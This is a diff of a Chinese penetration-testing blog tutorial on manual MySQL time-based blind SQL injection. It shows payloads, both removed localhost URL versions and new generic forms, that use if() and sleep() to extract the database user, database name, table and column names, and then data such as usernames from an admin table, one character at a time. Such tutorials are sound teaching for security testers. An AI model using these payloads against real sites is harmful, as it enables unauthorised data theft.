@@ -10,143 +10,116 @@ tags:
 categories: 渗透测试
 ---
 
-![](http://p3ek8hcdl.bkt.clouddn.com/image/SQLinject.jpg)<!-- more -->
-# Mysql手工盲注(延时注入)
+Mysql手工盲注(延时注入)<!-- more -->
 
 盲注的核心是靠 if 判断来注入
 ```
 length(xxxxx) 函数是统计字符串的长度
 
-mid(str,1,3) 字符串截取
+mid(str,1,3) 、substr(str,1,1)字符串截取
 
-ORD() 转换成ascii码
+ascii() 转换成ascii码
 
 if (条件,True,False);
 
 sleep(n)
 
 ```
-### 判断是否存在注入
+## 判断基于时间的盲注
+判断基于时间的盲注
 ```
-http://127.0.0.1/sql.php?id=1
+and if(1=1,sleep(5),1)
+and if(1=2,sleep(5),1)
+if(条件,True返回内容,False返回内容)用来进行判断，sleep()延时函数，单位秒。
 ```
-![](http://p3ek8hcdl.bkt.clouddn.com/image/f3cc1490325163.jpg)
+![](http://image.ixysec.com/image/sql/sql096.png)
+
+如上图所示，当if判断为真时，则会延时5s(如果文件中通过localhost连接数据库会延时5+1=6秒)；而if判断为假时，则不延时。
+
+## 猜解当前数据库用户名
+第一步：猜解用户名的长度。(猜解到的用户名长度用于下面的逐位猜解用户名)
 ```
-http://127.0.0.1/sql.php?id=1%20or%20sleep(2)
+and if((select length(user()))=长度,sleep(5),0)
 ```
-![](http://p3ek8hcdl.bkt.clouddn.com/image/15601490325259.jpg)
+![](http://image.ixysec.com/image/sql/sql097.png)
 
-### 暴当前的表有多少个字段：
+第二步：逐位猜解用户名。
 ```
-
-http://127.0.0.1/sql.php?id=1%20union%20select%20sleep(2)        #请求时间不到一秒 说明不是1个字段
-
-http://127.0.0.1/sql.php?id=1%20union%20select%201,sleep(2)        #请求时间不到一秒 说明不是2个字段
-
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(2)        #请求时间是2秒 说明是3个字段
+and if((select ascii(substr(user(),位数,1))=ascii码),sleep(5),0)
 ```
+![](http://image.ixysec.com/image/sql/sql098.png)
 
-### 获取数据库名长度：
+## 猜解当前数据库名
+第一步：猜解数据库名的长度。
 ```
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20length(database())=1),5,0))   #请求时间不到五秒 说明数据库名长度不是1
-
-一位一位试，中间过程省略
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20length(database())=5),5,0))   #请求时间是五秒 说明数据库名长度是5
+and if((select length(database()))=长度,sleep(5),0)
 ```
-![](http://p3ek8hcdl.bkt.clouddn.com/image/799b1490326149.jpg)
+![](http://image.ixysec.com/image/sql/sql099.png)
 
-### 获取数据库名：
+第二步：猜解数据库名。
 ```
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),1,1)=%22a%22),5,0))     #请求时间不到五秒 说明数据库名第一位不是a
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),1,1)=%22b%22),5,0))      #请求时间不到五秒 说明数据库名第一位不是b
-
-以此类推。。。。
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),1,1)=%22s%22),5,0))        #请求时间是五秒 说明数据库名第一位是s
-
-然后慢慢猜解到第5位
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),2,1)=%22q%22),5,0))        #请求时间是五秒 说明数据库名第二位是q
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),3,1)=%22l%22),5,0))        #请求时间是五秒 说明数据库名第三位是l
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),4,1)=%22i%22),5,0))        #请求时间是五秒 说明数据库名第四位是i
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),5,1)=%22n%22),5,0))        #请求时间是五秒 说明数据库名第五位是n
-
-这样就获取到数据库名是sqlin
+and if((select ascii(substr(database(),位数,1))=ascii码),sleep(5),0)
 ```
+![](http://image.ixysec.com/image/sql/sql100.png)
 
+## 猜表名
+第一步：判断表名的数量(以便逐个猜表名)
 ```
-当然了 这方法注入比较慢 比如有些数据库是特殊符号呢？那怎么办？一个一个符号猜解吗？
-采用ORD函数进行ascii码来判断会快点
-
-比如：
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((ORD((select%20mid(database(),1,1)))%3C120),5,0))   #小于120请求时间是五秒
-
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((ORD((select%20mid(database(),1,1)))%3C110),5,0))   #小于110请求时间不是五秒
-
-说明数据库名第一位的ascii码值在110~120之间   
-http://127.0.0.1/sql.php?id=1%20and%20sleep(if((ORD((select%20mid(database(),1,1)))=115),5,0))        #等于115请求时间是五秒
+and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(5),0)
 ```
-![](http://p3ek8hcdl.bkt.clouddn.com/image/d0091490327618.jpg)
-115对应的是s   跟我们获取到的sqlin一样
-其他四位也是一样的方法
+![](http://image.ixysec.com/image/sql/sql101.png)
 
-### 获取表名长度：
+第二步：判断某个表名的长度(以便逐位猜表名的数据)
 ```
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(length(table_name)=4,5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名长度是4
+and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(5),0)
 ```
+![](http://image.ixysec.com/image/sql/sql102.png)
 
-### 获取表名：
+第三步：逐位猜表名
 ```
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,1,1)=%22n%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是n
-
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,2,1)=%22e%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是e
-
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,3,1)=%22w%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是w
-
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,4,1)=%22s%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是s
+and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(5),0)
 ```
+![](http://image.ixysec.com/image/sql/sql103.png)
 
-### 获取表中的第一个字段长度：
+## 猜列名
+第一步：判断列名的数量(以便逐个猜列名)
 ```
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(length(column_name)=2,5,0))%20from%20information_schema.columns%20where%20table_name=0x6E657773%20limit%200,1             #请求时间是五秒 说明表名第一个字段长度是2
+and if((select count(column_name) from information_schema.columns where table_name='表名')=个数,sleep(5),0)
 ```
+![](http://image.ixysec.com/image/sql/sql104.png)
 
-### 获取表中的第一个字段名：
+第二步：判断某个列名的长度(以便逐位猜列名的数据)
 ```
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(column_name,1,1)=%22i%22,5,0))%20from%20information_schema.columns%20where%20table_name=0x6E657773%20limit%200,1            #请求时间是五秒 说明表名第一个字段名第一位是i
-
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(column_name,1,1)=%22d%22,5,0))%20from%20information_schema.columns%20where%20table_name=0x6E657773%20limit%200,1            #请求时间是五秒 说明表名第一个字段名第二位是d
-
-得出表名第一个字段名是id
+and if((select length(column_name) from information_schema.columns where table_name='表名' limit n,1)=长度,sleep(5),0)
 ```
-### 获取news表中id字段下的内容：
-先猜内容长度
+![](http://image.ixysec.com/image/sql/sql105.png)
 
+第三步：逐位猜列名
 ```
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(length(id)=1,5,0))%20from%20news%20limit%200,1       #请求时间是五秒 说明内容长度是1
+and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name='表名' limit n,1)=ascii码,sleep(5),0)
+```
+![](http://image.ixysec.com/image/sql/sql106.png)
 
-http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(id,1,1)=%221%22,5,0))%20from%20news%20limit%200,1       #请求时间是五秒 说明内容也是1
+## 猜数据
+第一步：判断数据的数量(以便逐个猜数据)
 ```
+and if((select count(列名) from 表名)=个数,sleep(5),0)
+```
+![](http://image.ixysec.com/image/sql/sql107.png)
 
-![](http://p3ek8hcdl.bkt.clouddn.com/image/032b1490329624.jpg)
+第二步：判断某个数据的长度(以便逐位猜数据)
+```
+and if((select length(username) from admin limit 0,1)=5,sleep(5),0)
+```
+![](http://image.ixysec.com/image/sql/sql108.png)
 
+第三步：逐位猜数据
+```
+and if((select ascii(substr(username,1,1)) from admin limit 0,1)=97,sleep(5),0)
+```
+![](http://image.ixysec.com/image/sql/sql109.png)
 
-### 补充
+**基于时间的盲注实质：**
 ```
-上面的语句查询其他表时会受到前面数据的影响
-两个表admin，news
-后面limit 0,1判断的就是第一个表admin   也就是猜第一位必须是a才返回true     后面limit 1,1的时候   猜第一位a和n都会返回true  其他false
+if(布尔盲注语句,sleep(5),1)
 ```
-查询其他表推荐语句
-```
-http://127.0.0.1/sqlin/sqltest.php?id=1%20and%20if((length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1))=4),sleep(5),0)
-感觉应该是查询语句和sleep执行顺序的问题
-```
-获取其他同理
-
-有错误的地方欢迎指正，共同进步。
